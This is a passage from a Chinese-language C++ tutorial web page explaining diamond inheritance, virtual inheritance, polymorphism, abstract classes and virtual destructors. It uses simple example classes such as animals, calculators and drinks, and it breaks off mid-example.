class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>总结： 多继承中如果父类中出现了同名情况，子类使用时候要加作用域</p>
</blockquote>
<h4 id="4-6-8-菱形继承"><a href="#4-6-8-菱形继承" class="headerlink" title="4.6.8 菱形继承"></a>4.6.8 菱形继承</h4><p><strong>菱形继承概念：</strong></p>
<p>​	两个派生类继承同一个基类</p>
<p>​	又有某个类同时继承者两个派生类</p>
<p>​	这种继承被称为菱形继承，或者钻石继承</p>
<p><strong>典型的菱形继承案例：</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/clip_image002.jpg"
                      alt="IMG_256"
                ></p>
<p><strong>菱形继承问题：</strong></p>
<ol>
<li><pre><code>羊继承了动物的数据，驼同样继承了动物的数据，当草泥马使用数据时，就会产生二义性。
</code></pre>
</li>
<li><p>草泥马继承自动物的数据继承了两份，其实我们应该清楚，这份数据我们只需要一份就可以。</p>
</li>
</ol>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//继承前加virtual关键字后，变为虚继承</span></span><br><span class="line"><span class="comment">//此时公共的父类Animal称为虚基类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sheep</span> : <span class="keyword">virtual</span> <span class="keyword">public</span> Animal &#123;&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tuo</span>   : <span class="keyword">virtual</span> <span class="keyword">public</span> Animal &#123;&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SheepTuo</span> : <span class="keyword">public</span> Sheep, <span class="keyword">public</span> Tuo &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SheepTuo st;</span><br><span class="line">	st.Sheep::m_Age = <span class="number">100</span>;</span><br><span class="line">	st.Tuo::m_Age = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;st.Sheep::m_Age = &quot;</span> &lt;&lt; st.Sheep::m_Age &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;st.Tuo::m_Age = &quot;</span> &lt;&lt;  st.Tuo::m_Age &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;st.m_Age = &quot;</span> &lt;&lt; st.m_Age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>总结：</p>
<ul>
<li>菱形继承带来的主要问题是子类继承两份相同的数据，导致资源浪费以及毫无意义</li>
<li>利用虚继承可以解决菱形继承问题</li>
</ul>
<h3 id="4-7-多态"><a href="#4-7-多态" class="headerlink" title="4.7  多态"></a>4.7  多态</h3><h4 id="4-7-1-多态的基本概念"><a href="#4-7-1-多态的基本概念" class="headerlink" title="4.7.1 多态的基本概念"></a>4.7.1 多态的基本概念</h4><p><strong>多态是C++面向对象三大特性之一</strong></p>
<p>多态分为两类</p>
<ul>
<li>静态多态: 函数重载 和 运算符重载属于静态多态，复用函数名</li>
<li>动态多态: 派生类和虚函数实现运行时多态</li>
</ul>
<p>静态多态和动态多态区别：</p>
<ul>
<li>静态多态的函数地址早绑定  -  编译阶段确定函数地址</li>
<li>动态多态的函数地址晚绑定  -  运行阶段确定函数地址</li>
</ul>
<p>下面通过案例进行讲解多态</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//Speak函数就是虚函数</span></span><br><span class="line">	<span class="comment">//函数前面加上virtual关键字，变成虚函数，那么编译器在编译的时候就不能确定函数调用了。</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">speak</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;动物在说话&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> :<span class="keyword">public</span> Animal</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">speak</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;小猫在说话&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> :<span class="keyword">public</span> Animal</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">speak</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;小狗在说话&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//我们希望传入什么对象，那么就调用什么对象的函数</span></span><br><span class="line"><span class="comment">//如果函数地址在编译阶段就能确定，那么静态联编</span></span><br><span class="line"><span class="comment">//如果函数地址在运行阶段才能确定，就是动态联编</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DoSpeak</span><span class="params">(Animal &amp; animal)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	animal.<span class="built_in">speak</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//多态满足条件： </span></span><br><span class="line"><span class="comment">//1、有继承关系</span></span><br><span class="line"><span class="comment">//2、子类重写父类中的虚函数</span></span><br><span class="line"><span class="comment">//多态使用：</span></span><br><span class="line"><span class="comment">//父类指针或引用指向子类对象</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Cat cat;</span><br><span class="line">	<span class="built_in">DoSpeak</span>(cat);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	Dog dog;</span><br><span class="line">	<span class="built_in">DoSpeak</span>(dog);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<p>多态满足条件</p>
<ul>
<li>有继承关系</li>
<li>子类重写父类中的虚函数</li>
</ul>
<p>多态使用条件</p>
<ul>
<li>父类指针或引用指向子类对象</li>
</ul>
<p>重写：函数返回值类型  函数名 参数列表 完全一致称为重写</p>
<h4 id="4-7-2-多态案例一-计算器类"><a href="#4-7-2-多态案例一-计算器类" class="headerlink" title="4.7.2 多态案例一-计算器类"></a>4.7.2 多态案例一-计算器类</h4><p>案例描述：</p>
<p>分别利用普通写法和多态技术，设计实现两个操作数进行运算的计算器类</p>
<p>多态的优点：</p>
<ul>
<li>代码组织结构清晰</li>
<li>可读性强</li>
<li>利于前期和后期的扩展以及维护</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//普通实现</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">getResult</span><span class="params">(string oper)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (oper == <span class="string">&quot;+&quot;</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> m_Num1 + m_Num2;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (oper == <span class="string">&quot;-&quot;</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> m_Num1 - m_Num2;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (oper == <span class="string">&quot;*&quot;</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> m_Num1 * m_Num2;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//如果要提供新的运算，需要修改源码</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_Num1;</span><br><span class="line">	<span class="type">int</span> m_Num2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//普通实现测试</span></span><br><span class="line">	Calculator c;</span><br><span class="line">	c.m_Num1 = <span class="number">10</span>;</span><br><span class="line">	c.m_Num2 = <span class="number">10</span>;</span><br><span class="line">	cout &lt;&lt; c.m_Num1 &lt;&lt; <span class="string">&quot; + &quot;</span> &lt;&lt; c.m_Num2 &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; c.<span class="built_in">getResult</span>(<span class="string">&quot;+&quot;</span>) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; c.m_Num1 &lt;&lt; <span class="string">&quot; - &quot;</span> &lt;&lt; c.m_Num2 &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; c.<span class="built_in">getResult</span>(<span class="string">&quot;-&quot;</span>) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; c.m_Num1 &lt;&lt; <span class="string">&quot; * &quot;</span> &lt;&lt; c.m_Num2 &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; c.<span class="built_in">getResult</span>(<span class="string">&quot;*&quot;</span>) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//多态实现</span></span><br><span class="line"><span class="comment">//抽象计算器类</span></span><br><span class="line"><span class="comment">//多态优点：代码组织结构清晰，可读性强，利于前期和后期的扩展以及维护</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AbstractCalculator</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> :</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">int</span> <span class="title">getResult</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> m_Num1;</span><br><span class="line">	<span class="type">int</span> m_Num2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//加法计算器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AddCalculator</span> :<span class="keyword">public</span> AbstractCalculator</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">getResult</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> m_Num1 + m_Num2;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//减法计算器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SubCalculator</span> :<span class="keyword">public</span> AbstractCalculator</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">getResult</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> m_Num1 - m_Num2;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//乘法计算器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MulCalculator</span> :<span class="keyword">public</span> AbstractCalculator</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">getResult</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> m_Num1 * m_Num2;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//创建加法计算器</span></span><br><span class="line">	AbstractCalculator *abc = <span class="keyword">new</span> AddCalculator;</span><br><span class="line">	abc-&gt;m_Num1 = <span class="number">10</span>;</span><br><span class="line">	abc-&gt;m_Num2 = <span class="number">10</span>;</span><br><span class="line">	cout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; <span class="string">&quot; + &quot;</span> &lt;&lt; abc-&gt;m_Num2 &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; abc-&gt;<span class="built_in">getResult</span>() &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">delete</span> abc;  <span class="comment">//用完了记得销毁</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建减法计算器</span></span><br><span class="line">	abc = <span class="keyword">new</span> SubCalculator;</span><br><span class="line">	abc-&gt;m_Num1 = <span class="number">10</span>;</span><br><span class="line">	abc-&gt;m_Num2 = <span class="number">10</span>;</span><br><span class="line">	cout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; <span class="string">&quot; - &quot;</span> &lt;&lt; abc-&gt;m_Num2 &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; abc-&gt;<span class="built_in">getResult</span>() &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">delete</span> abc;  </span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建乘法计算器</span></span><br><span class="line">	abc = <span class="keyword">new</span> MulCalculator;</span><br><span class="line">	abc-&gt;m_Num1 = <span class="number">10</span>;</span><br><span class="line">	abc-&gt;m_Num2 = <span class="number">10</span>;</span><br><span class="line">	cout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; <span class="string">&quot; * &quot;</span> &lt;&lt; abc-&gt;m_Num2 &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; abc-&gt;<span class="built_in">getResult</span>() &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">delete</span> abc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//test01();</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>总结：C++开发提倡利用多态设计程序架构，因为多态优点很多</p>
</blockquote>
<h4 id="4-7-3-纯虚函数和抽象类"><a href="#4-7-3-纯虚函数和抽象类" class="headerlink" title="4.7.3 纯虚函数和抽象类"></a>4.7.3 纯虚函数和抽象类</h4><p>在多态中，通常父类中虚函数的实现是毫无意义的，主要都是调用子类重写的内容</p>
<p>因此可以将虚函数改为<strong>纯虚函数</strong></p>
<p>纯虚函数语法：<code>virtual 返回值类型 函数名 （参数列表）= 0 ;</code></p>
<p>当类中有了纯虚函数，这个类也称为&#x3D;&#x3D;抽象类&#x3D;&#x3D;</p>
<p><strong>抽象类特点</strong>：</p>
<ul>
<li>无法实例化对象</li>
<li>子类必须重写抽象类中的纯虚函数，否则也属于抽象类</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//纯虚函数</span></span><br><span class="line">	<span class="comment">//类中只要有一个纯虚函数就称为抽象类</span></span><br><span class="line">	<span class="comment">//抽象类无法实例化对象</span></span><br><span class="line">	<span class="comment">//子类必须重写父类中的纯虚函数，否则也属于抽象类</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> :<span class="keyword">public</span> Base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;func调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Base * base = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//base = new Base; // 错误，抽象类无法实例化对象</span></span><br><span class="line">	base = <span class="keyword">new</span> Son;</span><br><span class="line">	base-&gt;<span class="built_in">func</span>();</span><br><span class="line">	<span class="keyword">delete</span> base;<span class="comment">//记得销毁</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>















<h4 id="4-7-4-多态案例二-制作饮品"><a href="#4-7-4-多态案例二-制作饮品" class="headerlink" title="4.7.4 多态案例二-制作饮品"></a>4.7.4 多态案例二-制作饮品</h4><p><strong>案例描述：</strong></p>
<p>制作饮品的大致流程为：煮水 -  冲泡 - 倒入杯中 - 加入辅料</p>
<p>利用多态技术实现本案例，提供抽象制作饮品基类，提供子类制作咖啡和茶叶</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1545985945198.png"
                      alt="1545985945198"
                ></p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//抽象制作饮品</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AbstractDrinking</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//烧水</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Boil</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//冲泡</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Brew</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//倒入杯中</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">PourInCup</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//加入辅料</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">PutSomething</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//规定流程</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">MakeDrink</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="built_in">Boil</span>();</span><br><span class="line">		<span class="built_in">Brew</span>();</span><br><span class="line">		<span class="built_in">PourInCup</span>();</span><br><span class="line">		<span class="built_in">PutSomething</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//制作咖啡</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Coffee</span> : <span class="keyword">public</span> AbstractDrinking &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//烧水</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Boil</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;煮农夫山泉!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//冲泡</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Brew</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;冲泡咖啡!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//倒入杯中</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">PourInCup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;将咖啡倒入杯中!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//加入辅料</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">PutSomething</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;加入牛奶!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//制作茶水</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tea</span> : <span class="keyword">public</span> AbstractDrinking &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//烧水</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Boil</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;煮自来水!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//冲泡</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Brew</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;冲泡茶叶!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//倒入杯中</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">PourInCup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;将茶水倒入杯中!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//加入辅料</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">PutSomething</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;加入枸杞!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//业务函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DoWork</span><span class="params">(AbstractDrinking* drink)</span> </span>&#123;</span><br><span class="line">	drink-&gt;<span class="built_in">MakeDrink</span>();</span><br><span class="line">	<span class="keyword">delete</span> drink;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">DoWork</span>(<span class="keyword">new</span> Coffee);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;--------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">DoWork</span>(<span class="keyword">new</span> Tea);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



















<h4 id="4-7-5-虚析构和纯虚析构"><a href="#4-7-5-虚析构和纯虚析构" class="headerlink" title="4.7.5 虚析构和纯虚析构"></a>4.7.5 虚析构和纯虚析构</h4><p>多态使用时，如果子类中有属性开辟到堆区，那么父类指针在释放时无法调用到子类的析构代码</p>
<p>解决方式：将父类中的析构函数改为<strong>虚析构</strong>或者<strong>纯虚析构</strong></p>
<p>虚析构和纯虚析构共性：</p>
<ul>
<li>可以解决父类指针释放子类对象</li>
<li>都需要有具体的函数实现</li>
</ul>
<p>虚析构和纯虚析构区别：</p>
<ul>
<li>如果是纯虚析构，该类属于抽象类，无法实例化对象</li>
</ul>
<p>虚析构语法：</p>
<p><code>virtual ~类名()&#123;&#125;</code></p>
<p>纯虚析构语法：</p>
<p><code> virtual ~类名() = 0;</code></p>
<p><code>类名::~类名()&#123;&#125;</code></p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Animal</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Animal 构造函数调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Speak</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//析构函数加上virtual关键字，变成虚析构函数</span></span><br><span class="line">	<span class="comment">//virtual ~Animal()</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	cout &lt;&lt; &quot;Animal虚析构函数调用！&quot; &lt;&lt; endl;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">virtual</span> ~<span class="built_in">Animal</span>() = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Animal::~<span class="built_in">Animal</span>()</span><br><span class="line">&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Animal 纯虚析构函数调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//和包含普通纯虚函数的类一样，包含了纯虚析构函数的类也是一个抽象类。不能够被实例化。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> : <span class="keyword">public</span> Animal &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Cat</span>(string name)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Cat构造函数调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		m_Name = <span class="keyword">new</span> <span class="built_in">string</span>(name);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Speak</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; *m_Name &lt;&lt;  <span class="string">&quot;小猫在说话!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	~<span class="built_in">Cat</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Cat析构函数调用!&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>-&gt;m_Name != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			